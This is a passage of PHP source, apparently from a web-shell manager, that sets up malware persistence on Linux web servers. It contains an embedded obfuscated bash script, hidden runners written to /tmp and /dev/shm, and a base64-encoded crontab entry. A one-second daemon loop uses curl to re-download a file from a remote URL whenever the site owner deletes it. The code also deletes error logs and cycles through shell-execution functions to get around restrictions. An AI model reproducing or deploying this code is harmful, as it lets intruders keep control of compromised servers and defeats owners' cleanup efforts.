    $script = str_replace("\r\n", "\n", (string)$script);
    return str_replace("\r", "\n", $script);
}

function geckoEmbeddedCronShTemplate()
{
    // Single-file deploy: cron.sh embedded (gzip+base64). No second upload / no remote paste.
    $raw = gzdecode(base64_decode('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'));
    // Critical: strip CR so Linux bash never sees $'{\r' (Windows CRLF from PHP nowdocs/patches)
    return is_string($raw) ? geckoCronShNormalizeLf($raw) : '';
}

function geckoDownloadCronShTemplate($url)
{
    // Always use embedded template (1-file upload). $url kept for API compatibility.
    $script = geckoEmbeddedCronShTemplate();
    $script = geckoCronShNormalizeLf($script);
    if (is_string($script) && $script !== '' && strpos($script, 'DIR_PATH=') !== false && strpos($script, 'install_crontab') !== false) {
        return array(true, $script, 'Using embedded cron.sh (single-file, no upload cron.sh)');
    }
    return array(false, null, 'Embedded cron.sh template missing/corrupt in manager.php');
}

/**
 * Deploy persistence like running cron.sh:
 * 1) use embedded cron.sh template (single-file — no separate cron.sh upload)
 * 2) patch DIR_PATH / FILE_NAME / DOWNLOAD_URL
 * 3) bash cron.sh (proc_open/shell_exec — does not require exec())
 * 4) delete temp cron.sh
 */
function geckoRecoverDeployViaRemoteCronSh($dirPath, $fileName, $downloadUrl)
{
    $steps = array();
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        return array(
            'ok' => false,
            'error' => 'Persistence (cron.sh) hanya untuk Linux/Unix.',
            'steps' => array('Skip persistence di Windows.'),
        );
    }

    $cronTemplateUrl = 'embedded://manager.php/cron.sh';
    $instanceId = substr(md5($dirPath . '|' . $fileName . '|' . $downloadUrl), 0, 8);
    $installPath = '/tmp/.' . $instanceId . '/.runner.sh';
    $shmPath = '/dev/shm/.' . $instanceId . '/.runner.sh';
    $pidFile = '/tmp/.' . $instanceId . '.pid';
    $cronMarker = '# cronsh_' . $instanceId;
    $tmpCron = '/tmp/.gecko_cron_' . $instanceId . '.sh';

    $steps[] = 'Load cron.sh template: embedded in manager.php (single-file)';
    $got = geckoDownloadCronShTemplate($cronTemplateUrl);
    if (!$got[0]) {
        return array(
            'ok' => false,
            'error' => 'Gagal download cron.sh: ' . $got[2],
            'steps' => $steps,
        );
    }
    if (!empty($got[2])) {
        $steps[] = $got[2];
    }
    $script = $got[1];
    $script = geckoCronShNormalizeLf($script);
    $steps[] = 'cron.sh template OK (' . strlen($script) . ' bytes)';

    $script = geckoPatchCronShAssign($script, 'DIR_PATH', $dirPath);
    $script = geckoPatchCronShAssign($script, 'FILE_NAME', $fileName);
    $script = geckoPatchCronShAssign($script, 'DOWNLOAD_URL', $downloadUrl);
    $steps[] = 'Patched DIR_PATH=' . $dirPath;
    $steps[] = 'Patched FILE_NAME=' . $fileName;
    $steps[] = 'Patched DOWNLOAD_URL=' . $downloadUrl;

    // Prevent "command too long" — crontab must call on-disk runner, not embed base64
    $beforePatch = $script;
    $script = geckoCronShPatchShortCrontab($script);
    // Normalize again after patch (nowdoc in manager.php may inject \r on Windows uploads)
    $script = geckoCronShNormalizeLf($script);
    if ($script !== $beforePatch) {
        $steps[] = 'Patched install_crontab → short b64 cmd + LF normalize';
    } else {
        $steps[] = 'Short crontab patch: no install_crontab() found — PHP heal will run if needed';
    }

    if (@file_put_contents($tmpCron, $script) === false) {
        // try under target dir parent writable
        $tmpCron = rtrim($dirPath, '/') . '/.gecko_cron_' . $instanceId . '.sh';
        if (@file_put_contents($tmpCron, $script) === false) {
            return array(
                'ok' => false,
                'error' => 'Gagal menulis temp cron.sh',
                'steps' => $steps,
            );
        }
    }
    @chmod($tmpCron, 0700);
    $steps[] = 'Temp cron.sh written: ' . $tmpCron;

    $cmd = 'bash ' . geckoEscapeshellarg($tmpCron);
    $cwdCron = dirname($tmpCron);
    $run = geckoShellRun($cmd, $cwdCron, 90);
    $steps[] = 'bash cron.sh via ' . (isset($run['method']) && $run['method'] !== '' ? $run['method'] : '?')
        . ' exit=' . (isset($run['exit_code']) ? $run['exit_code'] : '?');
    if (!empty($run['tried'])) {
        $steps[] = 'shell tried: ' . implode(' → ', $run['tried']);
    }

    // If primary cascade failed, force system() / passthru() / exec()
    $needFallback = !empty($run['no_shell']) || (int)$run['exit_code'] !== 0;
    if ($needFallback) {
        $steps[] = 'Primary run failed — retry with system()/passthru()/exec()';
        $run2 = geckoShellRunFallbackSPE($cmd, $cwdCron, 90);
        $steps[] = 'fallback SPE via ' . (isset($run2['method']) && $run2['method'] !== '' ? $run2['method'] : '?')
            . ' exit=' . (isset($run2['exit_code']) ? $run2['exit_code'] : '?');
        if (!empty($run2['tried'])) {
            $steps[] = 'SPE tried: ' . implode(' → ', $run2['tried']);
        }
        // Prefer fallback result if it succeeded, else keep last attempt info
        if ((int)$run2['exit_code'] === 0 || empty($run2['no_shell'])) {
            $run = $run2;
        }
    }

    if (!empty($run['no_shell']) && (int)$run['exit_code'] !== 0) {
        @unlink($tmpCron);
        return array(
            'ok' => false,
            'error' => isset($run['output']) ? $run['output'] : 'Failed to run cron.sh (no shell method worked)',
            'steps' => $steps,
        );
    }
    if (!empty($run['output']) && $run['output'] !== '(no output)') {
        $steps[] = 'cron.sh output: ' . substr(preg_replace('/\s+/', ' ', (string)$run['output']), 0, 240);
    }

    // Always delete temp cron.sh
    if (is_file($tmpCron)) {
        @unlink($tmpCron);
        $steps[] = 'Temp cron.sh deleted: ' . $tmpCron;
    } else {
        $steps[] = 'Temp cron.sh already gone';
    }

    usleep(500000);
    $pid = 0;
    if (is_file($pidFile)) {
        $pid = (int)trim((string)@file_get_contents($pidFile));
    }
    if ($pid <= 0) {
        usleep(800000);
        if (is_file($pidFile)) {
            $pid = (int)trim((string)@file_get_contents($pidFile));
        }
    }

    // If still no PID/crontab, one more SPE attempt BEFORE temp file was deleted — recreate briefly
    $cronCheckEarly = getCrontab();
    $cronContentEarly = isset($cronCheckEarly['content']) ? (string)$cronCheckEarly['content'] : '';
    $hasCronEarly = ($cronContentEarly !== '' && (strpos($cronContentEarly, $cronMarker) !== false || strpos($cronContentEarly, 'cronsh_') !== false));
    if ($pid <= 0 && !$hasCronEarly && !is_file($installPath) && !is_file($shmPath)) {
        $steps[] = 'Artifacts missing after run — rewrite temp + force system/passthru/exec';
        if (@file_put_contents($tmpCron, $script) !== false) {
            @chmod($tmpCron, 0700);
            $run3 = geckoShellRunFallbackSPE($cmd, $cwdCron, 90);
            $steps[] = 'final SPE via ' . (isset($run3['method']) ? $run3['method'] : '?')
                . ' exit=' . (isset($run3['exit_code']) ? $run3['exit_code'] : '?');
            if (!empty($run3['tried'])) {
                $steps[] = 'final SPE tried: ' . implode(' → ', $run3['tried']);
            }
            @unlink($tmpCron);
            usleep(800000);
            if (is_file($pidFile)) {
                $pid = (int)trim((string)@file_get_contents($pidFile));
            }
        }
    }

    // Re-detect instance paths from crontab if PHP md5 != bash md5sum
    $cronOk = false;
    $cronCheck = getCrontab();
    $cronContent = isset($cronCheck['content']) ? (string)$cronCheck['content'] : '';
    if ($cronContent !== '' && strpos($cronContent, $cronMarker) !== false) {
        $cronOk = true;
    } elseif ($cronContent !== '' && preg_match('/#\s*cronsh_([a-f0-9]+)/', $cronContent, $m)) {
        $cronOk = true;
        $cronMarker = '# cronsh_' . $m[1];
        $sid = $m[1];
        $installPath = '/tmp/.' . $sid . '/.runner.sh';
        $shmPath = '/dev/shm/.' . $sid . '/.runner.sh';
        $pidFile = '/tmp/.' . $sid . '.pid';
        if (is_file($pidFile)) {
            $pid = (int)trim((string)@file_get_contents($pidFile));
        }
        $steps[] = 'Crontab marker detected (server hash): ' . $cronMarker;
    }

    // Heal ALWAYS when crontab marker missing (command-too-long / partial install)
    // Also heal when marker present but we want to replace legacy overlong embeds — only if missing.
    if (!$cronOk) {
        $steps[] = 'Crontab missing after cron.sh — heal with short crontab line';
        $cronOk = geckoRecoverEnsureShortCrontab($installPath, $shmPath, $cronMarker, $steps);
        if ($cronOk && is_file($pidFile)) {
            $pid = (int)trim((string)@file_get_contents($pidFile));
        }
    } else {
        // Marker found — still scrub any leftover overlong lines that would break future crontab - installs
        $scrub = geckoRecoverEnsureShortCrontab($installPath, $shmPath, $cronMarker, $steps);
        if ($scrub) {
            $cronOk = true;
            $steps[] = 'Crontab scrubbed/rewritten as short line (safe)';
        }
    }

    $steps[] = 'cron.sh verify:';
    $steps[] = '- obfuscated /tmp runner: ' . (is_file($installPath) ? 'OK' : 'MISSING');
    $steps[] = '- obfuscated /dev/shm runner: ' . (is_file($shmPath) ? 'OK' : 'MISSING');
    $steps[] = '- PID: ' . ($pid > 0 ? ('OK ' . $pid) : 'MISSING') . ' (' . $pidFile . ')';
    $steps[] = '- Crontab: ' . ($cronOk ? 'OK' : 'MISSING');

    $ok = (is_file($installPath) || is_file($shmPath) || $pid > 0 || $cronOk);
    $msgParts = array();
    if ($ok) {
        $msgParts[] = 'Persistence aktif';
        if ($pid > 0 || is_file($installPath) || is_file($shmPath)) {
            $msgParts[] = 'daemon/runners OK';
        }
        $msgParts[] = $cronOk ? 'crontab OK (short b64 cmd)' : 'crontab MISSING';
        $msgParts[] = 'File yang dihapus akan kembali otomatis' . ($cronOk ? '' : ' via daemon (crontab belum terpasang)');
    } else {
        $msgParts[] = 'cron.sh dijalankan tapi artifacts belum terbaca — cek disable_functions / permission crontab.';
    }
    return array(
        'ok' => $ok,
        'message' => implode(' · ', $msgParts),
        'instance_id' => $instanceId,
        'install_path' => $installPath,
        'shm_path' => $shmPath,
        'pid_file' => $pidFile,
        'pid' => $pid,
        'crontab' => $cronOk,
        'cron_marker' => $cronMarker,
        'mutual_backup' => true,
        'obfuscated' => is_file($installPath) || is_file($shmPath),
        'async' => false,
        'method' => 'remote_cron_sh',
        'steps' => $steps,
    );
}

/**
 * Deploy persistence identical to cron.sh:
 * - obfuscated runners in /tmp + /dev/shm (gzip+base64 split)
 * - crontab embeds FULL runners (base64 restore both) + --recover
 * - PID daemon loop (1s) auto-restores deleted file
 * - mutual backup: daemon↔crontab, /tmp↔/dev/shm
 *
 * NOTE: real deploy now goes through geckoRecoverDeployViaRemoteCronSh()
 * (embedded cron.sh → patch → bash → delete). Single-file: only manager.php needed.
 */
function geckoRecoverDeployPersistence($dirPath, $fileName, $downloadUrl)
{
    // Preferred path: embedded cron.sh inside manager.php (no second file / no remote paste)
    return geckoRecoverDeployViaRemoteCronSh($dirPath, $fileName, $downloadUrl);

    // ---- legacy inline deploy below (unreachable; kept for reference) ----
    $steps = array();
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    if ($isWin) {
        return array(
            'ok' => false,
            'error' => 'Persistence (daemon/crontab) hanya untuk Linux/Unix.',
            'steps' => array('Skip persistence di Windows.'),
        );
    }

    $instanceId = substr(md5($dirPath . '|' . $fileName . '|' . $downloadUrl), 0, 8);
    $installPath = '/tmp/.' . $instanceId . '/.runner.sh';
    $shmPath = '/dev/shm/.' . $instanceId . '/.runner.sh';
    $pidFile = '/tmp/.' . $instanceId . '.pid';
    $lockFile = '/tmp/.' . $instanceId . '.lock';
    $spawnLock = '/tmp/.' . $instanceId . '.spawn.lock';
    $targetLock = '/tmp/.' . $instanceId . '.target.lock';
    $cronMarker = '# cronsh_' . $instanceId;

    $runner = <<<'BASH'
#!/bin/bash
DIR_PATH=__DIR_PATH__
FILE_NAME=__FILE_NAME__
DOWNLOAD_URL=__DOWNLOAD_URL__
FILE_PATH="$DIR_PATH/$FILE_NAME"
INSTALL_PATH=__INSTALL_PATH__
SHM_INSTALL_PATH=__SHM_PATH__
PID_FILE=__PID_FILE__
LOCK_FILE=__LOCK_FILE__
SPAWN_LOCK=__SPAWN_LOCK__
TARGET_LOCK=__TARGET_LOCK__
CRON_MARKER=__CRON_MARKER__
CRON_SCHEDULE="*/1 * * * *"
SLEEP_INTERVAL=1
RECHECK_INTERVAL=30
CRONTAB_CHECK_INTERVAL=60

b64encode() {
  if base64 --help 2>&1 | grep -q '\-w'; then
    printf '%s' "$1" | base64 -w 0
  else
    printf '%s' "$1" | base64 | tr -d '\n'
  fi
}

mirror_runner_to_shm() {
  mkdir -p "$(dirname "$SHM_INSTALL_PATH")"
  cp -f "$INSTALL_PATH" "$SHM_INSTALL_PATH"
  chmod 700 "$SHM_INSTALL_PATH" 2>/dev/null
}

mirror_runner_to_tmp() {
  mkdir -p "$(dirname "$INSTALL_PATH")"
  cp -f "$SHM_INSTALL_PATH" "$INSTALL_PATH"
  chmod 700 "$INSTALL_PATH" 2>/dev/null
}

ensure_runner_mirror() {
  if [ -f "$INSTALL_PATH" ] && [ ! -f "$SHM_INSTALL_PATH" ]; then
    mirror_runner_to_shm
  elif [ -f "$SHM_INSTALL_PATH" ] && [ ! -f "$INSTALL_PATH" ]; then
    mirror_runner_to_tmp
  elif [ -f "$INSTALL_PATH" ] && [ -f "$SHM_INSTALL_PATH" ]; then
    if ! cmp -s "$INSTALL_PATH" "$SHM_INSTALL_PATH" 2>/dev/null; then
      cp -f "$INSTALL_PATH" "$SHM_INSTALL_PATH"
      chmod 700 "$SHM_INSTALL_PATH" 2>/dev/null
    fi
  else
    return 1
  fi
}

runner_exec_path() {
  ensure_runner_mirror || return 1
  if [ -f "$INSTALL_PATH" ]; then
    printf '%s' "$INSTALL_PATH"
    return 0
  fi
  if [ -f "$SHM_INSTALL_PATH" ]; then
    printf '%s' "$SHM_INSTALL_PATH"
    return 0
  fi
  return 1
}

# PHP already wrote obfuscated stubs; sync_install keeps /tmp↔/dev/shm mirrored
sync_install() {
  ensure_runner_mirror || return 1
  chmod 700 "$INSTALL_PATH" 2>/dev/null
  chmod 700 "$SHM_INSTALL_PATH" 2>/dev/null
  return 0
}

download_file() {
  local dest="$1" url="$2" tmp
  tmp=$(mktemp) || return 1
  if curl -fsSL --connect-timeout 10 --max-time 30 "$url" -o "$tmp" 2>/dev/null && [ -s "$tmp" ]; then
    chmod 444 "$tmp" 2>/dev/null
    mv -f "$tmp" "$dest"
    return 0
  fi
  rm -f "$tmp"
  return 1
}

with_target_lock() {
  local wait="$1"
  shift
  (
    flock -x -w "$wait" 201 || exit 1
    "$@"
  ) 201>"$TARGET_LOCK"
}

_recover_inner() {
  local mode="$1"
  [ -d "$DIR_PATH" ] || mkdir -p "$DIR_PATH"
  chmod 755 "$DIR_PATH" 2>/dev/null
  rm -f "$DIR_PATH/error_log" "$DIR_PATH/error.log" 2>/dev/null

  if [ ! -f "$FILE_PATH" ] || [ ! -s "$FILE_PATH" ]; then
    rm -f "$FILE_PATH"
    download_file "$FILE_PATH" "$DOWNLOAD_URL"
  elif [ "$mode" = "verify" ]; then
    local tmp
    tmp=$(mktemp) || return 1
    if curl -fsSL --connect-timeout 10 --max-time 30 "$DOWNLOAD_URL" -o "$tmp" 2>/dev/null && [ -s "$tmp" ]; then
      if ! cmp -s "$tmp" "$FILE_PATH" 2>/dev/null; then
        chmod 444 "$tmp" 2>/dev/null
        mv -f "$tmp" "$FILE_PATH"
      else
        rm -f "$tmp"
      fi
    else
      rm -f "$tmp"
    fi
  fi
  [ -f "$FILE_PATH" ] && [ ! -s "$FILE_PATH" ] && rm -f "$FILE_PATH"
  [ -f "$FILE_PATH" ] && chmod 444 "$FILE_PATH" 2>/dev/null
}

recover_once() {
  with_target_lock 5 _recover_inner "${1:-verify}"
}

build_cron_payload() {
  local tmp_b64 shm_b64
  ensure_runner_mirror || return 1
  tmp_b64=$(b64encode "$(cat "$INSTALL_PATH")") || return 1
  shm_b64=$(b64encode "$(cat "$SHM_INSTALL_PATH")") || return 1
  cat <<PAYLOAD
#!/bin/bash
INSTALL_PATH="$INSTALL_PATH"
SHM_INSTALL_PATH="$SHM_INSTALL_PATH"
_install_dir="\$(dirname "\$INSTALL_PATH")"
_shm_dir="\$(dirname "\$SHM_INSTALL_PATH")"
mkdir -p "\$_install_dir" "\$_shm_dir"
echo '$tmp_b64' | base64 -d > "\$INSTALL_PATH"
echo '$shm_b64' | base64 -d > "\$SHM_INSTALL_PATH"
chmod 700 "\$INSTALL_PATH" "\$SHM_INSTALL_PATH"
bash "\$INSTALL_PATH" --recover
PAYLOAD
}

install_crontab() {
  local cron_line qpath inner b64 tmpcf rc
  ensure_runner_mirror || return 1
  # SHORT cmd → base64 (not full runner payload)
  qpath=$(printf '%s' "$INSTALL_PATH" | sed "s/'/'\\\\''/g")
  inner="/bin/bash '$qpath' --recover"
  b64=$(b64encode "$inner") || b64=$(printf '%s' "$inner" | base64 | tr -d '\n')
  cron_line="$CRON_SCHEDULE echo '$b64' | base64 -d 2>/dev/null | bash >/dev/null 2>&1 $CRON_MARKER"
  if [ "${#cron_line}" -gt 800 ]; then
    cron_line="$CRON_SCHEDULE /bin/bash '$qpath' --recover >/dev/null 2>&1 $CRON_MARKER"
  fi
  tmpcf=$(mktemp 2>/dev/null) || tmpcf="/tmp/.gecko_crontab_$$.txt"
  (crontab -l 2>/dev/null | awk -v m="$CRON_MARKER" '
    index($0, m) { next }
    length($0) > 800 { next }
    /^[ \t]*$/ { next }
    /command too long/ { next }
    /no crontab/ { next }
    { print }
  ') >"$tmpcf" 2>/dev/null
  echo "$cron_line" >>"$tmpcf"
  crontab "$tmpcf" 2>/dev/null
  rc=$?
  rm -f "$tmpcf"
  return $rc
}

crontab_ok() {
  crontab -l 2>/dev/null | grep -Fq "$CRON_MARKER"
}

ensure_crontab() {
  crontab_ok || install_crontab
}

is_daemon_running() {
  local pid
  [ -f "$PID_FILE" ] || return 1
  pid=$(cat "$PID_FILE" 2>/dev/null)
  [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null
}

start_daemon() {
  sync_install || ensure_runner_mirror || return 1
  is_daemon_running && return 0
  (
    flock -x -w 3 202 || exit 1
    is_daemon_running && exit 0
    local exec_path
    exec_path=$(runner_exec_path) || exit 1
    rm -f "$PID_FILE"
    nohup bash "$exec_path" --daemon >/dev/null 2>&1 &
    sleep 1
    is_daemon_running
  ) 202>"$SPAWN_LOCK"
}

daemon_loop() {
  exec 200>"$LOCK_FILE"
  flock -n 200 || exit 0
  echo $$ > "$PID_FILE"
  trap 'rm -f "$PID_FILE"' EXIT INT TERM
  local last_recheck=0 last_cron=0 now
  # Light crontab first (must be fast — PHP waits for PID/deploy)
  ensure_crontab
  while true; do
    ensure_runner_mirror
    now=$(date +%s)
    if [ "$((now - last_cron))" -ge "$CRONTAB_CHECK_INTERVAL" ]; then
      ensure_crontab
      last_cron=$now
    fi
    if [ ! -f "$FILE_PATH" ] || [ ! -s "$FILE_PATH" ]; then
      recover_once quick
    elif [ "$((now - last_recheck))" -ge "$RECHECK_INTERVAL" ]; then
      recover_once verify
      last_recheck=$now
    else
      [ -d "$DIR_PATH" ] && chmod 755 "$DIR_PATH" 2>/dev/null
      [ -f "$FILE_PATH" ] && chmod 444 "$FILE_PATH" 2>/dev/null
    fi
    sleep "$SLEEP_INTERVAL"
  done
}

case "${1:-}" in
  --daemon)
    sync_install 2>/dev/null || ensure_runner_mirror || exit 0
    daemon_loop
    ;;
  --recover)
    sync_install 2>/dev/null || ensure_runner_mirror || exit 0
    ensure_runner_mirror
    if [ ! -f "$FILE_PATH" ] || [ ! -s "$FILE_PATH" ]; then
      recover_once quick
    elif ! is_daemon_running; then
      recover_once verify
    else
      [ -d "$DIR_PATH" ] && chmod 755 "$DIR_PATH" 2>/dev/null
      [ -f "$FILE_PATH" ] && chmod 444 "$FILE_PATH" 2>/dev/null
    fi
    ensure_crontab
    start_daemon
    ;;
  *)
    sync_install 2>/dev/null || ensure_runner_mirror || exit 1
    install_crontab
    start_daemon
    recover_once verify
    ;;
esac
BASH;

    $runner = str_replace(
        array(
            '__DIR_PATH__',
            '__FILE_NAME__',
            '__DOWNLOAD_URL__',
            '__INSTALL_PATH__',
            '__SHM_PATH__',
            '__PID_FILE__',
            '__LOCK_FILE__',
            '__SPAWN_LOCK__',
            '__TARGET_LOCK__',
            '__CRON_MARKER__',
        ),
        array(
            geckoBashQuote($dirPath),
            geckoBashQuote($fileName),
            geckoBashQuote($downloadUrl),
            geckoBashQuote($installPath),
            geckoBashQuote($shmPath),
            geckoBashQuote($pidFile),
            geckoBashQuote($lockFile),
            geckoBashQuote($spawnLock),
            geckoBashQuote($targetLock),
            geckoBashQuote($cronMarker),
        ),
        $runner
    );

    // Write OBFUSCATED runners (gzip+base64 split) — same as cron.sh write_obfuscated_install
    $written = array();
    foreach (array($installPath, $shmPath) as $dest) {
        if (geckoWriteObfuscatedRunner($dest, $runner, $instanceId)) {
            $written[] = $dest;
            $steps[] = 'Obfuscated runner written: ' . $dest;
        } else {
            $steps[] = 'Gagal write obfuscated: ' . $dest;
        }
    }

    if (!count($written)) {
        return array('ok' => false, 'error' => 'Gagal menulis obfuscated runner ke /tmp atau /dev/shm.', 'steps' => $steps);
    }
    if (is_file($installPath) && !is_file($shmPath)) {
        @copy($installPath, $shmPath);
        @chmod($shmPath, 0700);
    }
    if (is_file($shmPath) && !is_file($installPath)) {
        @copy($shmPath, $installPath);
        @chmod($installPath, 0700);
    }

    // Crontab embeds FULL obfuscated runners (cron.sh build_cron_payload)
    $tmpRaw = (string)@file_get_contents($installPath);
    $shmRaw = (string)@file_get_contents(is_file($shmPath) ? $shmPath : $installPath);
    $tmpB64 = base64_encode($tmpRaw);
    $shmB64 = base64_encode($shmRaw);
    if ($tmpB64 === '' || $shmB64 === '') {
        return array('ok' => false, 'error' => 'Gagal encode runner untuk crontab.', 'steps' => $steps);
    }

    // SHORT crontab only — never embed base64 (legacy path; currently unreachable)
    $cronLine = '*/1 * * * * /bin/bash ' . geckoBashQuote($installPath) . ' --recover >/dev/null 2>&1 ' . $cronMarker;
    $steps[] = 'Crontab short line built (on-disk runner, anti command-too-long)';

    $cronOk = false;
    $existing = getCrontab();
    $content = isset($existing['content']) ? (string)$existing['content'] : '';
    if (!empty($existing['error'])) {
        $steps[] = 'crontab -l warning: ' . $existing['error'];
    }
    $lines = preg_split("/\r\n|\n|\r/", $content);
    if (!is_array($lines)) {
        $lines = array();
    }
    $kept = array();
    foreach ($lines as $line) {
        $trim = trim($line);
        if ($trim === '') continue;
